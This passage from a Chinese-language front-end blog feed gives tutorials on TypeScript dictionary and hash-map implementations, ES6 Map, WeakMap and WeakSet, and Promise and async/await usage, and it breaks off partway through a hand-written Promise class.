language_">this</span>.<span class="title function_">keyValues</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="title function_">size</span>(); i++) &#123;</span><br><span class="line">            <span class="title function_">cb</span>(pair[i].<span class="property">key</span>, pair[i].<span class="property">value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">keyPair</span> &#123;</span><br><span class="line">    <span class="attr">key</span>: <span class="built_in">any</span>;</span><br><span class="line">    <span class="attr">value</span>: <span class="built_in">any</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">key: <span class="built_in">any</span>, value: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">key</span> = key;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">value</span> = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dir = <span class="keyword">new</span> <span class="title class_">Dictionary</span>();</span><br></pre></td></tr></table></figure>
<h1>hashMap 散列表</h1>
<p>散列表将 key 通过一个散列函数转化为固定长度, 解决了字典结构如果 key 过长会造成查找时间过长的问题</p>
<h2 id="散列表的代码实现">散列表的代码实现</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; keyPair &#125; <span class="keyword">from</span> <span class="string">&quot;./map&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hashMap</span> &#123;</span><br><span class="line">    table = &#123;&#125; <span class="keyword">as</span> &#123;</span><br><span class="line">        [<span class="attr">k</span>: <span class="built_in">string</span>]: <span class="built_in">any</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">toStr</span>(<span class="params">item: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (item === <span class="literal">null</span>) <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (item === <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">&quot;undefined&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;string&quot;</span> || item <span class="keyword">instanceof</span> <span class="title class_">String</span>)</span><br><span class="line">            <span class="keyword">return</span> item <span class="keyword">as</span> <span class="built_in">string</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">hashCode</span>(<span class="params">key: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="comment">// 将对象转换为字符串, 然后将字符串的ascii码值相加, 最后取余</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> key === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> tableKey = <span class="variable language_">this</span>.<span class="title function_">toStr</span>(key);</span><br><span class="line">        <span class="keyword">let</span> hash = <span class="number">5381</span>;</span><br><span class="line">        [...tableKey].<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            hash = hash * <span class="number">33</span> + item.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> hash % <span class="number">1013</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">set</span>(<span class="params">key: <span class="built_in">any</span>, value: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key &amp;&amp; value) &#123;</span><br><span class="line">            <span class="keyword">const</span> position = <span class="variable language_">this</span>.<span class="title function_">hashCode</span>(key);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">table</span>[position] = <span class="keyword">new</span> <span class="title function_">keyPair</span>(key, value);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params">key: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">table</span>[<span class="variable language_">this</span>.<span class="title function_">hashCode</span>(key)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">remove</span>(<span class="params">key: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> hash = <span class="variable language_">this</span>.<span class="title function_">hashCode</span>(key);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">table</span>[hash]) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">table</span>[hash];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>ES6 的 Map</h1>
<p>ES6 中的 Map 结构可以用来存储键值对，其使用方法如下：</p>
<ol>
<li class="lvl-3">
<p>创建一个空的 Map 对象</p>
</li>
</ol>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myMap = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>添加键值对到 Map 中</p>
</li>
</ol>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">myMap.<span class="title function_">set</span>(key, value);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>从 Map 中获取某个键对应的值</p>
</li>
</ol>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> value = myMap.<span class="title function_">get</span>(key);</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>检查 Map 中是否存在指定的键</p>
</li>
</ol>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hasKey = myMap.<span class="title function_">has</span>(key);</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>获取 Map 中所有的键或值</p>
</li>
</ol>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> keys = myMap.<span class="title function_">keys</span>();</span><br><span class="line"><span class="keyword">const</span> values = myMap.<span class="title function_">values</span>();</span><br></pre></td></tr></table></figure>
<ol start="6">
<li class="lvl-3">
<p>获取 Map 中键值对的数量</p>
</li>
</ol>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> size = myMap.<span class="property">size</span>;</span><br></pre></td></tr></table></figure>
<ol start="7">
<li class="lvl-3">
<p>遍历 Map 中的所有键值对</p>
</li>
</ol>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">myMap.<span class="title function_">forEach</span>(<span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 处理每个键值对</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>需要注意的是，Map 中的键可以是任何类型的值，而不仅限于字符串和数字。此外，Map 也提供了其他一些有用的方法，比如删除特定键的值，清空 Map 等。</p>
<h1>WeakMap 和 WeakSet</h1>
<p>WeakMap 和 WeakSet 是 ES6 中新增的两种集合类型，它们都具有以下特点：</p>
<ol>
<li class="lvl-3">
<p>只能存储对象作为键，不能使用原始值类型（如字符串、数字等）作为键。</p>
</li>
<li class="lvl-3">
<p>对于存储在集合中的对象，当没有其他对象引用它们时，它们会被自动回收。</p>
</li>
</ol>
<p>其中，WeakMap 是一种以弱引用方式存储键值对的类似 Map 的数据结构。与 Map 不同的是，WeakMap 中的键只能是对象，而且这些对象都是弱引用的。也就是说，当某个对象作为 WeakMap 的键时，如果没有其他对象引用该键所对应的对象，则这个键值对会被自动从 WeakMap 中删除，以释放其占用的内存。</p>
<p>以下是一个使用 WeakMap 的示例：</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myWeakMap = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> key = &#123;&#125;; <span class="comment">// 创建一个新对象</span></span><br><span class="line"></span><br><span class="line">myWeakMap.<span class="title function_">set</span>(key, <span class="string">&quot;value&quot;</span>); <span class="comment">// 将这个对象作为键存储到 WeakMap 中</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myWeakMap.<span class="title function_">get</span>(key)); <span class="comment">// 输出 &quot;value&quot;</span></span><br><span class="line"></span><br><span class="line">key = <span class="literal">null</span>; <span class="comment">// 将原来的键对象置为 null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于没有任何其他对象引用这个键所对应的值，因此这个键值对会被自动删除</span></span><br></pre></td></tr></table></figure>
<p>另一方面，WeakSet 是一种以弱引用方式存储对象的类似 Set 的数据结构。与 Set 不同的是，WeakSet 中的元素只能是对象，而且这些对象都是弱引用的。也就是说，当某个对象作为 WeakSet 的元素时，如果没有其他对象引用该元素，则这个元素会被自动从 WeakSet 中删除，以释放其占用的内存。</p>
<p>以下是一个使用 WeakSet 的示例：</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myWeakSet = <span class="keyword">new</span> <span class="title class_">WeakSet</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj1 = &#123;&#125;; <span class="comment">// 创建两个新对象</span></span><br><span class="line"><span class="keyword">const</span> obj2 = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">myWeakSet.<span class="title function_">add</span>(obj1); <span class="comment">// 将这两个对象添加到 WeakSet 中</span></span><br><span class="line">myWeakSet.<span class="title function_">add</span>(obj2);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myWeakSet.<span class="title function_">has</span>(obj1)); <span class="comment">// 输出 true</span></span><br><span class="line"></span><br><span class="line">obj1 = <span class="literal">null</span>; <span class="comment">// 将 obj1 置为 null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于没有任何其他对象引用 obj1，因此它会被自动从 WeakSet 中删除</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>TypeScript下给定时器标注类型</title>
    <url>/20220720/TypeScript%E4%B8%8B%E7%BB%99%E5%AE%9A%E6%97%B6%E5%99%A8%E6%A0%87%E6%B3%A8%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">timer</span>: <span class="title class_">NodeJS</span>.<span class="property">Timeout</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line"><span class="built_in">clearTimeout</span>(timer);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>TypeScript</tag>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title>Promise 总结</title>
    <url>/20230503/Promise-%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="回调地狱">回调地狱</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>缺点:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>代码耦合性太强, 牵一发而动全身, 难以维护</p>
</li>
<li class="lvl-4">
<p>大量冗余代码相互嵌套, 代码可读性变差</p>
</li>
</ul>
<h2 id="如何解决回调地狱的问题">如何解决回调地狱的问题</h2>
<p>为了解决回调地狱的问题, ES6 新增了 <code>Promise ​</code> 的概念</p>
<h2 id="Promise-的三种状态">Promise 的三种状态</h2>
<p>Promise 通过自身状态, 来控制异步操作, Promise 实例有三种状态</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>异步操作未完成(<code>pending</code>)</p>
</li>
<li class="lvl-4">
<p>异步操作成功(<code>fulfilled</code>)</p>
</li>
<li class="lvl-4">
<p>异步操作失败(<code>rejected</code>)</p>
</li>
</ul>
<p>这三种的状态变化途径只有两种</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>从未完成到成功</p>
</li>
<li class="lvl-4">
<p>从未完成到失败</p>
</li>
</ul>
<p>一旦状态发生变化, 就会凝固, 不会发生新变化, Promise 的状态变化只会发生一次</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>异步操作成功，Promise 实例传回一个值(va1ue),状态变为 <code>fulfilled</code>。</p>
</li>
<li class="lvl-4">
<p>异步操作失败，Promise 实例抛出一个错误(error),状态变为 <code>rejected</code>。</p>
</li>
</ul>
<p><img src="assets/Snipaste_2023-05-02_16-01-52-20230502160159-qki5eww.png" alt="Snipaste_2023-05-02_16-01-52"></p>
<h3 id="Promise-的链式调用">Promise 的链式调用</h3>
<p><code>promise</code> 支持链式调用, 通过 <code>return</code> 一个 <code>promise实例</code> 来链式调用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pro = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> res = <span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.5</span>;</span><br><span class="line">        <span class="keyword">if</span> (res) <span class="title function_">resolve</span>(res);</span><br><span class="line">        <span class="keyword">else</span> <span class="title function_">reject</span>(res);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pro.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    <span class="comment">// 如果返回的是非Promise对象, 那么默认转换为fulfilled,并将return的结果传递到下一个then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 123</span></span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<p>注意:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>如果返回的是非 <code>Promise ​</code> 对象, 那么默认转换为 <code>fulfilled</code>,并将 <code>return ​</code> 的结果传递到下一个 <code>then</code></p>
</li>
<li class="lvl-4">
<p>如果返回 <code>Promise</code> 对象, 那么返回的对象的状态取决于 <code>Promise</code> 实例的状态</p>
</li>
</ul>
<h2 id="通过-catch-捕获错误">通过.catch 捕获错误</h2>
<p>在 Promise 的链式操作中, 可以通过 <code>.catch</code> 来捕获错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tfs.<span class="title function_">readFile</span>(<span class="string">&quot;./txt/1.txt&quot;</span>, <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        <span class="keyword">return</span> tfs.<span class="title function_">readFile</span>(<span class="string">&quot;./txt/12.txt&quot;</span>, <span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        <span class="keyword">return</span> tfs.<span class="title function_">readFile</span>(<span class="string">&quot;./txt/3.txt&quot;</span>, <span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h1>Promise 的对象方法</h1>
<p><code>Promise</code>是个对象, 也是一个构造函数</p>
<h2 id="Promise-resolve">Promise.resolve()</h2>
<p>返回一个 <code>resolved</code> 状态的 <code>promise</code> 实例</p>
<h2 id="Promise-reject">Promise.reject()</h2>
<p>返回一个 <code>reject</code> 状态的 <code>promise</code> 实例</p>
<p>以上两个方法如果传入 <code>promise</code> 对象, 那么会原样返回, 不会更改实例状态</p>
<h2 id="Promise-all-方法">Promise.all()方法</h2>
<p><code>Promise.all()</code> 方法可以并行执行多个任务, 并且等到所有任务都 <code>fulfilled</code> 之后再执行 <code>.then()</code> 方法, 如果有一个 <code>reject</code>, 那么状态就会变成 <code>reject</code></p>
<p>注意:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>只有 p1、p2、p3 的状态都变成 <code>fulfilled</code>,p 的状态才会变成 <code>fulfilled</code>,此时 p1、p2、p3 的返回值组成一个数组，传递给 p 的回调函数。</p>
</li>
<li class="lvl-4">
<p>只要 pl、p2、p3 之中有一个被 <code>rejected</code>,p 的状态就变成 <code>rejected</code>,此时第一个被 <code>reject</code> 的实例的返回值，会传递给 p 的回调函数。</p>
</li>
</ul>
<h2 id="Promise-race-方法">Promise.race() 方法</h2>
<p><code>Promise.race()</code> 方法会发起并行的 <code>Promise</code> 异步操作, 只要有一个任务 <code>fulfilled</code> 或 <code>reject</code>, 整个 promise 就会 <code>fulfilled</code> 或 <code>reject</code></p>
<h2 id="Promise-allSettled-方法">Promise.allSettled()方法</h2>
<p>该方法在全部的 <code>promise ​</code> 结束之后(成功或失败)执行 <code>.then</code>, 返回一个包含状态和结果值得对象</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">allSettled</span>([<span class="title function_">pro</span>(<span class="number">1</span>), <span class="title function_">pro</span>(-<span class="number">1</span>), <span class="title function_">pro</span>(<span class="number">1</span>)]).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;);</span><br><span class="line">[</span><br><span class="line">    &#123; <span class="attr">status</span>: <span class="string">&quot;fulfilled&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;123&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">status</span>: <span class="string">&quot;rejected&quot;</span>, <span class="attr">reason</span>: <span class="string">&quot;err&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">status</span>: <span class="string">&quot;fulfilled&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;123&quot;</span> &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<h2 id="Promise-any">Promise.any()</h2>
<p>只要有一个任务变成 <code>fulfilled</code>, 那么整个就会 <code>fulfilled</code>, 只有全部 <code>reject</code>, 那么才会 <code>reject</code>,</p>
<p>与 <code>race</code> 的区别, <code>race</code> 只要第一个 <code>reject</code>, 那么整体就会 <code>reject</code>, 而 <code>any</code> 则是全部 <code>reject</code> 才会 <code>reject</code></p>
<h2 id="Promise-系列方法总结">Promise 系列方法总结</h2>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>resolved 的条件</th>
<th>reject 的条件</th>
<th>resolve 返回值</th>
</tr>
</thead>
<tbody>
<tr>
<td>all</td>
<td>所有 Promise 实例都成功时</td>
<td>任意一个 Promise 实例失败时</td>
<td>包含所有实例结果数组</td>
</tr>
<tr>
<td>race</td>
<td>第一个 Promise 实例状态变为 resolved 时</td>
<td>第一个 Promise 实例状态变为 rejected 时</td>
<td>第一个实例返回的结果</td>
</tr>
<tr>
<td>allSettled</td>
<td>所有 Promise 实例完成，不论是否成功或失败</td>
<td>不会抛出异常</td>
<td>包含每个实例状态及结果的数组</td>
</tr>
<tr>
<td>any</td>
<td>第一个 Promise 实例成功时</td>
<td>所有 Promise 实例均失败时</td>
<td>第一个实例的返回值</td>
</tr>
</tbody>
</table>
<h1>封装 Promise 方法</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pro = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> res = <span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.5</span>;</span><br><span class="line">        <span class="keyword">if</span> (res) <span class="title function_">resolve</span>(res);</span><br><span class="line">        <span class="keyword">else</span> <span class="title function_">reject</span>(res);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pro.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    <span class="comment">// 如果返回的是非Promise对象, 那么默认转换为fulfilled,并将return的结果传递到下一个then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">// 123</span></span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h1>async/await</h1>
<p><code>async/await</code> 是 es8 (ECMA 2017)引入的新语法, 用来简化 Promise 的异步操作, 在 <code>async/await</code> 出现之前, 开发只能通过链式 <code>.then</code> 的方法处理 Promise 异步操作</p>
<h2 id="基本使用">基本使用</h2>
<p>如果在一个 <code>Promise</code> 实例的前面加上 await, 那么可以直接获取到该实例的返回值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getallFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> r1 = <span class="keyword">await</span> <span class="title function_">getFile</span>(<span class="string">&quot;./txt/1.txt&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(r1);</span><br><span class="line">    <span class="keyword">const</span> r2 = <span class="keyword">await</span> <span class="title function_">getFile</span>(<span class="string">&quot;./txt/2.txt&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(r2);</span><br><span class="line">    <span class="keyword">const</span> r3 = <span class="keyword">await</span> <span class="title function_">getFile</span>(<span class="string">&quot;./txt/3.txt&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(r3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getallFile</span>();</span><br></pre></td></tr></table></figure>
<h2 id="async-await-的注意事项">async/await 的注意事项</h2>
<ul class="lvl-0">
<li class="lvl-4">
<p>如果 <code>function</code> 内部使用了 <code>await</code> 修饰, 那么 <code>function</code> 必须使用 <code>async</code> 修饰</p>
</li>
<li class="lvl-4">
<p>在 <code>async</code> 方法中, 第一个 <code>await</code> 之前的代码会同步执行, <code>await</code> 之后的代码会异步执行</p>
</li>
<li class="lvl-4">
<p>如果在 <code>async</code> 函数内返回一个普通值, <code>async</code> 函数会自动将该值包装成一个 <code>Promise</code> 对象，并直接 <code>resolved</code></p>
</li>
<li class="lvl-4">
<p>如果 <code>async</code> 函数内返回一个 <code>promise</code> 对象, <code>async ​</code> 函数返回的仍然是一个 <code>Promise</code> 对象，但其实际结果取决于所返回的 <code>Promise</code> 的状态</p>
</li>
</ul>
<h2 id="顶层-await">顶层 await</h2>
<p>可以在 es 模块顶层中使用 await</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="keyword">type</span>=<span class="string">&quot;module&quot;</span>&gt;<span class="keyword">await</span> xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1>手写 Promise</h1>
<h2 id="Promise-A-标准">Promise/A+标准</h2>
<p>Promise/A+ 是 JavaScript 中 Promise 对象的一个规范，它是 Promises/A+ Working Group 提出的标准。这个组织成立于 2010 年，旨在推动 Promise 的发展并制定一致的行业规范。</p>
<p>Promise/A+ 主要定义了 Promise 对象的行为和特征，以确保不同实现之间具有良好的互操作性。其中包括：</p>
<ol>
<li class="lvl-3">
<p>Promise 是一个对象或函数，具有 then 方法。</p>
</li>
<li class="lvl-3">
<p>then 方法接受两个参数：onFulfilled 和 onRejected，分别代表 Promise 成功时和失败时的回调函数。</p>
</li>
<li class="lvl-3">
<p>then 方法返回一个新的 Promise 对象，并且可以链式调用多次，每次调用都会返回一个新的 Promise 对象。</p>
</li>
<li class="lvl-3">
<p>最终状态只能是成功（fulfilled）或者失败（rejected），并且状态不可逆转。</p>
</li>
<li class="lvl-3">
<p>如果某个 then 方法中的回调函数返回了一个值 x，则根据 x 的类型来处理该值：</p>
<ul class="lvl-2">
<li class="lvl-6">如果 x 是一个 Promise 对象，则等待该 Promise 对象的状态变更，然后根据其最终状态处理当前 Promise 对象；</li>
<li class="lvl-6">如果 x 是一个普通对象或函数，则将当前 Promise 对象的状态设为 fulfilled，并把 x 作为新的 Promise 对象传递给下一个 then 方法；</li>
<li class="lvl-6">如果 x 失败，则将当前 Promise 对象的状态设为 rejected，并把 x 的错误信息向下传递给下一个 catch 方法。</li>
</ul>
</li>
</ol>
<p>通过符合 Promise/A+ 规范，就能确保不同的 Promise 实现都遵循相同的方法调用和状态转移逻辑，从而简化了 JavaScript 中异步编程的复杂性。</p>
<h2 id="手写-Promise">手写 Promise</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">PromiseStatus</span> &#123;</span><br><span class="line">    <span class="string">&quot;pending&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fulfilled&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rejected&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">MyPromise</span> &#123;</span><br><span class="line">    <span class="comment">// promise内部状态</span></span><br><span class="line">    status = <span class="title class_">PromiseStatus</span>.<span class="property">pending</span>;</span><br><span class="line">    <span class="comment">// promise结果</span></span><br><span class="line">    <span class="attr">result</span>: <span class="built_in">any</span> = <span class="literal">undefined</span>;</span><br><span class="line">    <span class="comment">// 回调函数列表</span></span><br><span class="line">    <span class="attr">callback</span>: &#123;</span><br><span class="line">        <span class="attr">successCB</span>: <span class="title class_">Function</span>;</span><br><span class="line">        <span class="attr">failCB</span>: <span class="title class_">Function</span>;</span><br><span class="line">    &#125;[] = [];</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">executor: (resolve: <span class="built_in">Function</span>, reject: <span class="built_in">Function</span>) =&gt; <span class="built_in">void</span></span>) &#123;</span><br><span class="line">        <span class="comment">// promise被new的同时, 执行器函数就运行</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">executor</span>(<span class="variable language_">this</span>.<span class="property">resolve</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>), <span class="variable language_">this</span>.<span class="property">reject</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="params">value: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="comment">// promise的状态一经改变, 就会凝固</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> != <span class="title class_">PromiseStatus</span>.<span class="property">pending</span>) &#123;</span><br><span class="line">            <span 